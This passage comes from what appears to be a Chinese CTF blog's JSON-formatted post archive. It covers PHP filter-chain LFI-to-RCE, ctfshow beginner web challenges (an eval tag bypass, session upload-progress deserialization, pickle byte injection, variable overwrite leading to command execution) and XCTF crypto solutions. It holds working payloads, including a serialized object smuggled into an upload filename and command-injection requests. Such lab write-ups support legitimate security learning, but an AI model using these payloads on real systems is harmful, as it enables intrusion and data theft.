'convert.iconv.UTF8.CSISO2022KR|convert.iconv.LATIN7.MACINTOSH|convert.iconv.CSN_369103.CSIBM1388',\n    'F': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSIBM9448.ISO-IR-103|convert.iconv.ISO-IR-199.T.61|convert.iconv.IEC_P27-1.CP937',\n    'G': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_8859-3:1988.CP1142|convert.iconv.CSIBM16804.CSIBM1388',\n    'H': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.EUCJP-OPEN|convert.iconv.CP5347.CP1144',\n    'I': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-6.DS2089|convert.iconv.OSF0004000A.CP852|convert.iconv.HPROMAN8.T.618BIT|convert.iconv.862.CSIBM1143',\n    'J': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.US.ISO-8859-13|convert.iconv.CP9066.CSIBM285',\n    'K': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM1097.UTF-16BE',\n    'L': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ECMACYRILLIC.IBM256|convert.iconv.GEORGIAN-ACADEMY.10646-1:1993|convert.iconv.IBM-1122.IBM920',\n    'M': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.SE2.ISO885913|convert.iconv.866NAV.ISO2022JP2|convert.iconv.CP857.CP930',\n    'N': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM9066.UTF7|convert.iconv.MIK.CSIBM16804',\n    'O': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-197.CSIBM275|convert.iconv.IBM1112.UTF-16BE|convert.iconv.ISO_8859-3:1988.CP500',\n    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',\n    'Q': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.NO.CP275|convert.iconv.EBCDIC-GREEK.CP936|convert.iconv.CP922.CP1255|convert.iconv.MAC-IS.EBCDIC-CP-IT',\n    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',\n    'S': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1154.UCS4',\n    'T': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM1163.CP1388|convert.iconv.OSF10020366.MS-MAC-CYRILLIC|convert.iconv.ISO-IR-25.ISO-IR-85|convert.iconv.GREEK.IBM-1144',\n    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',\n    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',\n    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',\n    'X': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.OSF10020388.IBM-935|convert.iconv.CP280.WINDOWS-1252|convert.iconv.CP284.IBM256|convert.iconv.CP284.LATIN1',\n    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',\n    'Z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO90.CSEBCDICFISE',\n    '+': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ANSI_X3.4-1986.CP857|convert.iconv.OSF10020360.ISO885913|convert.iconv.EUCCN.UTF7|convert.iconv.GREEK7-OLD.UCS4',\n    '=': ''\n}\n\n```\n\n但是这里的过滤器链是否稳定呢？\n\n例如我们这里看看b字符的构造\n\n```php\n'b': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1399.UCS4',\n```\n\n然后本地测试一下\n\n```\nroot@VM-16-12-ubuntu:/# php 1.php \n1b2429435354415254\n\n\u001b$)CSTARTc28fc284c289efbda2efbdabefbdac1aefbdaaefbdac\n｢ｫｬｪｬ\n0000008f00000084000000890000ff620000ff6b0000ff6c0000001a0000ff6a0000ff6c\n����b�k�l�j�l\n```\n\n这里可以看到b字符成功生成且被前置，但是我们又发现一个新的问题，那就是内容被更改，原先的字符串START在转换的过程中发生了更改，这意味着我们现在的过滤器链会破坏我们之前的内容\n\n按照这种逻辑，即使CSISO 2022 KR看起来很有前途，但它实际上并没有那么有用。它前置链`'\\x1b$）C'`，因为'C'是base64的64个字符之一，如果你的一个链使用这种编码，而你前置了'C'以外的东西，这意味着你的过滤器链将不稳定。\n\n## 稳定的过滤器链生成\n\n然后就到了第一个师傅送给大家的福利啦！一个生成filter器链的脚本，这个脚本如果我们完全控制传递给PHP中的require或include的参数，无需上传文件即可获取RCE！\n\n[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)\n\n我们看看这个脚本的参数\n\n![image-20250519143942700](../image/achieve/202411/RCE的bypass/image-20250519143942700.png)\n\n参数\n\n- chain：你想注入的PHP链\n- rawbase 64：将base64放在最后一次解码之前，这在调试PHP过滤器链时很有用！\n\n例如拿XYCTF2024的ezLFI的题目说一下\n\n## XYCTF2024-ezLFI\n\n```php\n<?php include_once($_REQUEST['file']);\n```\n\n这里也是有文件包含的函数，直接用脚本生成filter链\n\n![image-20250519144612520](../image/achieve/202411/RCE的bypass/image-20250519144612520.png)\n\n然后我们看看这个链子生成的结果是什么\n\n![image-20250519144707260](../image/achieve/202411/RCE的bypass/image-20250519144707260.png)\n\n发现代码成功生成并前置了\n\n传进参数中发现成功进行RCE\n\n![image-20250519144801375](../image/achieve/202411/RCE的bypass/image-20250519144801375.png)\n\n额外补充一个问题，就是需要有效文件的问题\n\n## php://temp解决有效文件的问题\n\n这个技巧的一个主要问题就是需要一个有效的文件路径，当然，我们可以用已知的/etc/passwd，但是因为PHP包装器允许一个嵌套到另一个，所以我们可以通过使用PHP包装器php：//temp作为整个过滤器链的输入资源，不再需要猜测目标文件系统上的有效路径，这取决于操作系统。\n\n![image-20250519145803624](../image/achieve/202411/RCE的bypass/image-20250519145803624.png)\n\n```\nroot@VM-16-12-ubuntu:/opt/php_filter_chain_RCE/php_filter_chain_generator# php -r \"echo require('php://filter/convert.base64-decode/resource=php://temp');\"\"\n1\n```\n\n至此浅浅的部分就结束了，后面就是深挖从一个编码转向另一个编码的技巧了，这个后面再学吧\n","tags":["RCE和文件包含"],"categories":["对于RCE和文件包含的一点总结"]},{"title":"ctfshow新手杯","url":"/2025/05/18/ctfshow新手杯/","content":"\n# easy_eval\n\n```php\n<?php\n\n\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$code = $_POST['code'];\n\nif(isset($code)){\n\n  $code = str_replace(\"?\",\"\",$code);\n  eval(\"?>\".$code);\n\n}\n\n```\n\n用原标签打不了了，只能换其他标签\n\n```\ncode=<script language=\"php\"> phpinfo();</script>\n```\n\n然后代码执行就行\n\n# 剪刀石头布\n\n要求赢一百局才能拿到flag，show一下source\n\n源码太长了，分段分析一下\n\n```php\n<?php\n    ini_set('session.serialize_handler', 'php');\n    if(isset($_POST['source'])){\n        highlight_file(__FILE__);\n    phpinfo();\n    die();\n    }\n    error_reporting(0);\n    include \"flag.php\";\n    class Game{\n        public $log,$name,$play;\n\n        public function __construct($name){\n            $this->name = $name;\n            $this->log = '/tmp/'.md5($name).'.log';\n        }\n\n        public function play($user_input,$bot_input){\n            $output = array('Rock'=>'&#9996;&#127995;','Paper'=>'&#9994;&#127995;','Scissors'=>'&#9995;&#127995;');\n            $this->play = $user_input.$bot_input;\n            if($this->play == \"RockRock\" || $this->play == \"PaperPaper\" || $this->play == \"ScissorsScissors\"){\n                file_put_contents($this->log,\"<div>\".$output[$user_input].' VS '.$output[$bot_input].\" Draw</div>\\n\",FILE_APPEND);\n                return \"Draw\";\n            } else if($this->play == \"RockPaper\" || $this->play == \"PaperScissors\" || $this->play == \"ScissorsRock\"){\n                file_put_contents($this->log,\"<div>\".$output[$user_input].' VS '.$output[$bot_input].\" You Lose</div>\\n\",FILE_APPEND);\n                return \"You Lose\";\n            } else if($this->play == \"RockScissors\" || $this->play == \"PaperRock\" || $this->play == \"ScissorsPaper\"){\n                file_put_contents($this->log,\"<div>\".$output[$user_input].' VS '.$output[$bot_input].\" You Win</div>\\n\",FILE_APPEND);\n                return \"You Win\";\n            }\n        }\n\n        public function __destruct(){\n                echo \"<h5>Game History</h5>\\n\";\n        echo \"<div class='all_output'>\\n\";\n                echo file_get_contents($this->log);\n        echo \"</div>\";\n        }\n    }\n\n?>\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <link rel=\"icon\" href=\"icon.png\">\n    <title>Rock Paper Scissors</title>\n    <!-- post 'source' to view something --> \n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n\n<?php\n    session_start();\n    if(isset($_POST['name'])){\n        $_SESSION['name']=$_POST['name'];\n        $_SESSION['win']=0;\n    }\n    if(!isset($_SESSION['name'])){\n        ?>\n        <body>\n            <h5>Input your name :</h5>\n            <form method=\"post\">\n            <input type=\"text\" class=\"result\" name=\"name\"></input>\n            <button type=\"submit\">submit</button>\n            </form>\n        </body>\n        </html>\n<?php exit();\n    }\n\n?>\n\n\n<body>\n<?php\necho \"<h5>Welecome \".$_SESSION['name'].\", now you win \".$_SESSION['win'].\" rounds.</h5>\";\n$Game=new Game($_SESSION['name']);\n?>\n    <h5>Make your choice :</h5>\n    <form method=\"post\">\n    <button type=\"submit\" value=\"Rock\" name=\"choice\">&#9996;&#127995;</button>\n    <button type=\"submit\" value=\"Paper\" name=\"choice\">&#9994;&#127995;</button>\n    <button type=\"submit\" value=\"Scissors\" name=\"choice\">&#9995;&#127995;</button>\n    </form>\n\n    <?php\n    $choices = array(\"Rock\", \"Paper\", \"Scissors\");\n    $rand_bot = array_rand($choices);\n    $bot_input = $choices[$rand_bot];\n    if(isset($_POST[\"choice\"]) AND in_array($_POST[\"choice\"],$choices)){\n        $user_input = $_POST[\"choice\"];\n        $result=$Game->play($user_input,$bot_input);\n        if ($result==\"You Win\"){\n            $_SESSION['win']+=1;\n        } else {\n            $_SESSION['win']=0;\n        }\n    } else {\n        ?>\n        <form method=\"post\">\n        <button class=\"flag\" value=\"flag\" name=\"flag\">get flag</button>\n        <button class=\"source\" value=\"source\" name=\"source\">show source</button>\n        </form>\n        <?php\n        if(isset($_POST[\"flag\"])){\n            if($_SESSION['win']<100){\n                echo \"<div>You need to win 100 rounds in a row to get flag.</div>\";\n            } else {\n                echo \"Here is your flag:\".$flag;\n            }\n\n        }\n    }\n    ?>\n</body>\n</html>\n\n```\n\n其实这里的话我看到开头这个ini_set设置就猜到是session反序列化了，看了一下配置，发现用的序列化引擎确实不一样\n\n![image-20250518125948985](../image/achieve/202411/新手杯/image-20250518125948985.png)\n\n然后看一下是否需要条件竞争\n\n```\nsession.upload_progress.cleanup\tOff\n```\n\n关掉了，那就轻松一点\n\n这里的话很简单，直接读取flag文件就行了，其他的代码都不重要，写poc\n\n```php\n<?php\nclass Game\n{\n    public $log = \"/var/www/html/flag.php\";\n}\n$a = new Game();\necho serialize($a);\n//O:4:\"Game\":1:{s:3:\"log\";s:22:\"/var/www/html/flag.php\";}\n?>\n```\n\n生成链子，然后写个上传文件的html\n\n```php+HTML\n<form action=\"https://153d0900-ae62-44d4-a0c2-f76f6c47d1da.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\">\n    <!--题目地址 -->\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n```\n\n然后上传我们的payload\n\n```text\nPOST / HTTP/1.1\nHost: 153d0900-ae62-44d4-a0c2-f76f6c47d1da.challenge.ctf.show\nContent-Length: 352\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryH8mc98xrP0GIwfwA\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: cross-site\nCookie: PHPSESSID=wanth3f1ag\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\n\n------WebKitFormBoundaryH8mc98xrP0GIwfwA\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n1\n------WebKitFormBoundaryH8mc98xrP0GIwfwA\nContent-Disposition: form-data; name=\"file\"; filename=\"|O:4:\\\"Game\\\":1:{s:3:\\\"log\\\";s:22:\\\"/var/www/html/flag.php\\\";}\"\nContent-Type: text/plain\n\n123\n------WebKitFormBoundaryH8mc98xrP0GIwfwA--\n\n```\n\n这里的话PHP_SESSION_UPLOAD_PROGRESS会将内容保存到我们的sessid文件中，然后在回调函数read执行的时候进行反序列化就会触发destruct魔术方法\n\n# baby_pickle\n\n看附件\n\n```python\n# Author:\n#   Achilles\n# Time:\n#   2022-9-20\n# For:\n#   ctfshow\nimport base64\nimport pickle, pickletools\nimport uuid\nfrom flask import Flask, request\n\napp = Flask(__name__)\nid = 0\nflag = \"ctfshow{\" + str(uuid.uuid4()) + \"}\"\n\nclass Rookie():\n    def __init__(self, name, id):\n        self.name = name\n        self.id = id\n\n\n@app.route(\"/\")\ndef agent_show():\n    global id\n    id = id + 1\n\n    if request.args.get(\"name\"):\n        name = request.args.get(\"name\")\n    else:\n        name = \"new_rookie\"\n\n    new_rookie = Rookie(name, id)\n    try:\n        file = open(str(name) + \"_info\", 'wb')\n        info = pickle.dumps(new_rookie, protocol=0)\n        info = pickletools.optimize(info)\n        file.write(info)\n        file.close()\n    except Exception as e:\n        return \"error\"\n\n    with open(str(name)+\"_info\", \"rb\") as file:\n        user = pickle.load(file)\n\n    message = \"<h1>欢迎来到新手村\" + user.name + \"</h1>\\n<p>\" + \"只有成为大菜鸡才能得到flag\" + \"</p>\"\n    return message\n\n\n@app.route(\"/dacaiji\")\ndef get_flag():\n    name = request.args.get(\"name\")\n    with open(str(name)+\"_info\", \"rb\") as f:\n        user = pickle.load(f)\n\n    if user.id != 0:\n        message = \"<h1>你不是大菜鸡</h1>\"\n        return message\n    else:\n        message = \"<h1>恭喜你成为大菜鸡</h1>\\n<p>\" + flag + \"</p>\"\n        return message\n\n\n@app.route(\"/change\")\ndef change_name():\n    name = base64.b64decode(request.args.get(\"name\"))\n    newname = base64.b64decode(request.args.get(\"newname\"))\n\n    file = open(name.decode() + \"_info\", \"rb\")\n    info = file.read()\n    print(\"old_info ====================\")\n    print(info)\n    print(\"name ====================\")\n    print(name)\n    print(\"newname ====================\")\n    print(newname)\n    info = info.replace(name, newname)\n    print(info)\n    file.close()\n    with open(name.decode()+ \"_info\", \"wb\") as f:\n        f.write(info)\n    return \"success\"\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8888)\n\n```\n\n看到pickle.load函数第一个想的就是pickle反序列化\n\n分析一下，flask框架，在/路由下接收一个name参数并将name和id传入Rookie中并实例化对象后序列化传入文件中，然后在/dacaiji路由下检测id的值，如果值是0才能拿到flag，但是前面id是不可控的\n\n最后在/change路由下，这里会对name进行重命名newname，说明这里的name可控，也是我们的入手点\n\n先可控pickle序列化后的内容是什么样的\n\n```python\nimport pickle, pickletools\nclass Rookie():\n    def __init__(self, name, id):\n        self.name = name\n        self.id = id\n\nname = \"test\"\nid = 1\n\nnew_rookie = Rookie(name, id)\n\nfile = open(str(name) + \"_info\", 'wb')\ninfo = pickle.dumps(new_rookie, protocol=0)\ninfo = pickletools.optimize(info)\nfile.write(info)\nfile.close()\n```\n\n生成test_info文件\n\n```\nccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVtest\nsVid\nI1\nsb.\n```\n\n这里就是pickle序列化后的字节流了，然后这里的话id是1，我们这时候该怎么去改变id的值呢？\n\n这里可以看到末尾的sb.是结束了的，那我们是否可以构造一个name的值让sb.提前结束呢？\n\npayload\n\n```\ntest\nsVid\nI0\nsb.\n```\n\n本地测试一下\n\n```python\nimport pickle,pickletools\nimport base64\n\nname = base64.b64decode(\"dGVzdA==\")\n\nnewname = base64.b64decode(\"dGVzdApzVmlkCkkwCnNiLg==\")\n\nfile = open(name.decode() + \"_info\", \"rb\")\ninfo = file.read()\ninfo = info.replace(name, newname)\nfile.close()\nwith open(name.decode() + \"_info\", \"wb\") as f:\n    f.write(info)\n    print(\"success\")\n```\n\n```text\nccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVtest\nsVid\nI0\nsb.\nsVid\nI1\nsb.\n```\n\n可以看到这里是成功写入了，那我们就可以试着打一下\n\nbase64编码一下\n\n```\n/?name=test\n/change?name=dGVzdA==&newname=dGVzdApzVmlkCkkwCnNiLg==\n/dacaiji?name=test\n```\n\n# repairman\n\n根页面打开一会就跳转了，然后啥线索都没有\n\n然后把mode参数的值从1改为0就跳转到源代码页面了\n\n```php\nYour mode is the guest!hello,the repairman! <?php\nerror_reporting(0);\nsession_start();\n$config['secret'] = Array();\ninclude 'config.php';\nif(isset($_COOKIE['secret'])){\n    $secret =& $_COOKIE['secret'];\n}else{\n    $secret = Null;\n}\n\nif(empty($mode)){\n    $url = parse_url($_SERVER['REQUEST_URI']);\n    parse_str($url['query']);\n    if(empty($mode)) {\n        echo 'Your mode is the guest!';\n    }\n}\n\nfunction cmd($cmd){\n    global $secret;\n    echo 'Sucess change the ini!The logs record you!';\n    exec($cmd);\n    $secret['secret'] = $secret;\n    $secret['id'] = $_SERVER['REMOTE_ADDR'];\n    $_SESSION['secret'] = $secret;\n}\n\nif($mode == '0'){\n    //echo var_dump($GLOBALS);\n    if($secret === md5('token')){\n        $secret = md5('test'.$config['secret']);\n        }\n\n        switch ($secret){\n            case md5('admin'.$config['secret']):\n                echo 999;\n                cmd($_POST['cmd']);\n            case md5('test'.$config['secret']):\n                echo 666;\n                $cmd = preg_replace('/[^a-z0-9]/is', 'hacker',$_POST['cmd']);\n                cmd($cmd);\n            default:\n                echo \"hello,the repairman!\";\n                highlight_file(__FILE__);\n        }\n    }elseif($mode == '1'){\n        echo '</br>hello,the user!We may change the mode to repaie the server,please keep it unchanged';\n    }else{\n        header('refresh:5;url=index.php?mode=1');\n        exit;\n    }\n```\n\n审了一下代码，发现`$secret =& $_COOKIE['secret'];`这里是引用赋值，此时`$secret` 和 `$_COOKIE['secret']` 指向同一个值。\n\n因为这里并不知道`$config['secret']`的内容，所以这里只能进入666的分支，但是这里只能通过字母数字执行命令，而且无回显，想rce几乎不可能，那我们只能走向999的分支了，问题是怎么构造呢？\n\n```php\nif(empty($mode)){\n    $url = parse_url($_SERVER['REQUEST_URI']);\n    parse_str($url['query']);\n    if(empty($mode)) {\n        echo 'Your mode is the guest!';\n    }\n}\n```\n\n这里有一个变量覆盖的函数，一开始没想到这段代码有什么用，只觉得传一个mode而已，后面无路可走了返回来看，想到可以覆盖变量修改`$config['secret']`的内容，我们试一下\n\n```\n?mode=0&config[secret]=1&secret=e00cf25ad42683b3df678c61f42c6bda\n```\n\n这里因为可以变量覆盖，所以不需要再往cookie里去传了\n\n输出999，意味着我们进入了这一分支，我们传命令打无回显RCE\n\n```\ncmd=cat config.php > flag.txt\n```\n\n![image-20250518160519032](../image/achieve/202411/新手杯/image-20250518160519032.png)\n\n# 简单的数据分析\n\n有一个/source/model.txt\n\n```python\nD = random.randint(100, 200)\npData = [numpy.random.random(D)*100,numpy.random.random(D)*100,numpy.random.random(D)*100]\n\ntry:\n    data = request.form.getlist('data[]')\n    data = list(map(float,data))\n    data = numpy.array(data)\nexcept:\n    msg=\"数据转换失败\"\n\ntry:\n    distance =[numpy.linalg.norm(A-data) for A in pData]\n    avgdist = numpy.mean(numpy.abs(distance - numpy.mean(distance))**2)\n    if avgdist<0.001:\n        msg= flag\n    else:\n        msg= f\"您的数据与三个聚类中心的欧拉距离分别是<br><br>{distance}均方差为:{avgdist}\"\nexcept:\n    msg=\"未提交数据或数据维度有误\"\n```\n\n- 生成三个长度为 `D` 的随机数组（`pData`），每个数组的元素是 0 到 100 之间的随机浮点数。然后从表单中获取名为 `data[]` 的输入字段的值，并将其转换为浮点数列表，之后将列表转化成数组\n- 然后就是计算欧拉距离了，这里会将计算我们传入的数据data和pData数组中三个聚类中心之间的欧拉距离，并计算这些距离的方均差，如果均方差小于 0.001，返回 `flag`。\n\n不会啊完全看不明白入手点在哪，先搁置一下吧\n\n\n\n","tags":["新手杯"],"categories":["ctfshow"]},{"title":"攻防世界一波Crypto的学习","url":"/2025/05/16/攻防世界一波Crypto的学习/","content":"\n# 0x01前言\n\n前两天有一个学长喊我给他做几道XCTF平台上的密码题，刚好之前一直很少接触，这次也当作是初学密码了\n\n# 0x02题目\n\n# NTRU sample(GFSJ1205)\n\n# tell_aes_app(GFSJ1187)\n\n# Uncommon Factors II(GFSJ1149)\n\n# Equation(GFSJ1120)\n\n# babyECC2(GFSJ1119)\n\n# Red Alert 2（速来1v1）(GFSJ1104)\n\n# crypto_rsa2(GFSJ1054)\n\n# crackme_c(GFSJ0039)\n\n# babyrsa(GFSJ0114)\n\n# wacky-agent-75(GFSJ0211)\n\n# salsa(GFSJ0222)\n\n# sleeping-guard(GFSJ0434)\n\n# mix(GFSJ0750)\n\n# babystream(GFSJ0821)\n\n# 圆舞曲(GFSJ0824)\n\n## #椭圆曲线加密ECC\n\n题目描述：Tover说不想出题了，我把他上年的防AK题改了一下（逃随机数生成器就是逊啦，xor yyds！\n\n华南师范大学的一个新生赛题\n\n先看看附件的代码，并分析了一下代码的意思\n\n```python\n#sage\nfrom secret import flag\nimport random\n\nbits = 64\np = random_prime(2^bits)#生成一个64位的随机素数p\na = randint(1, bits)\nb = randint(1, bits)#生成两个随机整数a和b作为椭圆曲线的参数\nE = EllipticCurve(GF(p), [a, b])#生成了一个椭圆曲线E，llipticCurve 是 SageMath 中用于定义椭圆曲线的函数。\ng = E.random_element()#从曲线上随机取一个点g\n\nx = random_prime(2^16)#生成一个16位的随机数\npk = x*g#生成公钥pk\nk = randint(1, p-1)#生成随机数k用于加密算法\nkPoint = k*pk\nkp = kPoint.xy()#提取 kPoint 的坐标 (x, y)，并将其存储在 kp 中。\n\nc = []#一个空列表\nfor i in range(len(flag)):#遍历flag的字符\n  c.append( (ord(flag[i]) ^^ int(kp[i%2])) & 0xff )\n#将字符转化成ASCII码值，并与kp中的坐标值进行异或XOR操作，并将结果限制在 0 到 255 之间后将结果添加到列表 c 中。\nc = bytes(c).hex()#将列表 c 转换为字节，并转换为十六进制字符串。\n\nprint(p)\nprint(a)\nprint(b)\nprint(g)\n#print(g.order())\nprint(c)\n\n\n#out\n'''\n4698491801183562589\n58\n59\n(2965797230620625775 : 4310564666276679314 : 1)\nac73a774a25bd512d543dc468542c9428141800dd041d043c918d112850dd515d6128214d1138211d71599\n\n'''\n```\n\nout文件就是sage文件代码中的五个输出\n\n是基于椭圆曲线加密(ECC)的简单加密算法，加密的内容就是flag\n\n加密过程很简单，就是将flag的第i个字符与kp的两个分量进行异或，但是这里可以注意到\n\n![image-20250517103707352](../image/achieve/202411/攻防世界/image-20250517103707352.png)\n\n并且这是华师2021年的新生赛，flag格式当时写的是HSCTF{}或者hsctf{}，所以kp还是可以爆出来的\n\n这道题还是很简单的，把kp爆破出来然后解密就行了\n\n```python\nc = 'ac73a774a25bd512d543dc468542c9428141800dd041d043c918d112850dd515d6128214d1138211d71599'\nc = bytes.fromhex(c)\n#print(c)\n#flag:HSCTF{...}\nkey = [c[0]^ord('H'),c[1]^ord('S')]\n#print(key)\nflag = ''\nfor i in range(len(c)):\n    flag += chr(c[i] ^ key[i%2])\nprint(flag)\n#HSCTF{121c8fab-bead-4a4c-852a-1522f453f135}\n```\n\nflag就是HSCTF{121c8fab-bead-4a4c-852a-1522f453f135}\n\n# RSA(GFSJ0820)\n\n## #RSA加密算法\n\nRSA算法来了\n\n先看看附件的源码加上解释\n\n```python\n#!/usr/bin/env python3\nimport gmpy2\nfrom Crypto.Util.number import getPrime\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\nfrom base64 import b64encode\n\n\nflag = open('flag', 'r').read().strip() * 23#读取flag的内容去掉首位空白字符并重复23次\n\n\ndef encrypt(p, q, e, msg):\n    #加密函数 encrypt\n    #p，q是两个大素数\n    while True:\n        n = p * q#计算模数\n        try:\n            phi = (p - 1)*(q - 1)#计算欧拉函数 phi，用于 RSA 密钥生成。\n            pubkey = RSA.construct((int(n), int(e)))#使用模数 n 和公钥指数 e 构造 RSA 公钥。\n            key = PKCS1_v1_5.new(pubkey)#使用 PKCS#1 v1.5 填充方案初始化加密器。\n            enc = b64encode(key.encrypt(msg))#对消息 msg 进行加密，并将加密结果编码为 Base64 字符串。\n            return enc#返回加密后的 Base64 字符串，并退出函数。\n        except:\n            p = gmpy2.next_prime(p**2 + q**2)\n            q = gmpy2.next_prime(2*p*q)\n            e = gmpy2.next_prime(e**2)\n\n\np = getPrime(128)\nq = getPrime(128)#生成两个 128 位的素数 p 和 q。\nn = p*q#计算模数 n = p * q。\ne = getPrime(64)#生成一个 64 位的素数 e 作为公钥指数。\npubkey = RSA.construct((n, e))#使用 n 和 e 构造 RSA 公钥。\nwith open('pubkey.pem', 'wb') as f:\n    f.write(pubkey.exportKey())#生成的 RSA 公钥保存到文件 pubkey.pem \nwith open('flag.enc', 'wb') as g:\n    g.write(encrypt(p, q, e, flag.encode()))#encrypt 函数加密 flag，并将加密结果保存到文件 flag.enc\n\n#pubkey\n'''\n-----BEGIN PUBLIC KEY-----\nMEIwDQYJKoZIhvcNAQEBBQADMQAwLgIhAIk/BV0Nxf52TYgdXNYOlnshLOBJRZ5X\n0uhB7UqBr3ftAgkAiLTiOfpI5Vc=\n-----END PUBLIC KEY-----\n'''\n#flag\n'''DWsGDe5mZXvs8l4kHjjteTLbV4rJ9JHwpUrZaQ/eqPT2YYiHwalRHZeobzcKRbBvcvqf1NYwJCuFwpDOnWK73bnQO06HaHdsSnRCqCy7slRnhs4QSIWkpeA3RlzSrDb/oNbuT8t/+HhlZbooWiCywnTsZWGjWwFvaGCvhEkZCLR17OB/7ZxXYhHaUCcyGmLGjpYEZGqGKU80Lu6VGenRRxmg4qsVI6T/GgXQjSZT43mIXCD+5g7zVUIfFAMQKYmwcYNWxOJZm7P9EbYQUTYNDU96hIgxrVCaMV7c1m5oLYdm99OkfyOk/lQ67KZLjSJIOSCmaJ3bHpuqDXdHPuxv9daB+31qu9eWQl2WuyuzM9U0Cd+oR+xMJcdGvLk/8wm+CPhkwnmMSVkYb7qXvaFZcap8/F5ZbzFAHLl+YKFsisRIq8iLQc1lttW7/E3dt4ds+ixfPakErgVUzKaziSDG1Ja/byqV9VdmqR0TCAtcIfmVZHu+doO1HnOJlmIb6IDwuBSwba825/E4sMM24RK/PscuXaAQGAkyKI+apX7PUObFE6XA7KMSDleikIQ7HYFsGJISGzbP0mX6iFn8qoUI82p98y2grsNBGKm3uBb3Zump8eqgJh5MMdiPCRir5uRPZpT6weepqr3i7uPTLy91QpXeG7b2OowRs6MmEB8vxyLkhIJvJrNTehXmb/2EXJwXQBEqiDAJ0+0QE0PUsegHqcYIoMNtHFt4UPX7Dm2p+Mi9a+fnXzC9GMUwqcL6JXG8W6V9yWSUBoG2mIhCX/dM2Cnrm3wprccV+Hi4gdnEfRKuDjuVBAJ0kBQrGjwK1JgoWbIItmwxGKu70olIwQN7LspUCiJH3Bkalo9crFTDGFJr7qBdMz2+7FBb7hYT9mLSxAo1UoZYtraQJoxNJQs81rG8IPq27upPj6xenTFYHhSRnJwEFAOvam2+rXTnyQO2DME='''\n```\n\nRSA加密算法的话可以先看看文章https://www.cnblogs.com/xiaxveliang/p/12395993.html，还是很常见的\n\n这种算法题一般调教ai就能出来，但是得慢慢调了\n\n解密步骤\n\n- 从 `pubkey.pem` 文件中读取公钥，提取模数 `n` 和公钥指数 `e`。\n\n  ```python\n  from Crypto.PublicKey import RSA\n  \n  with open('pubkey.pem','rb') as f:\n      pubkey = RSA.importKey(f.read())\n  #print(pubkey)\n  \n  #提取模数n和公钥指数e\n  n = pubkey.n\n  e = pubkey.e\n  \n  # print(n)\n  #n = 62078208638445817213739226854534031566665495569130972218813975279479576033261\n  # print(e)\n  #e = 9850747023606211927\n  ```\n\n- 因为p和q只有128位，所以可以分解模数 `n`获取p和q，可以用大整数分解网站https://factordb.com/\n\n![image-20250517110634814](../image/achieve/202411/攻防世界/image-20250517110634814.png)\n\n所以拿到\n\n```python\nq=184333227921154992916659782580114145999\np=336771668019607304680919844592337860739\n```\n\n- 计算私钥\n  - 计算欧拉函数 `phi = (p - 1) * 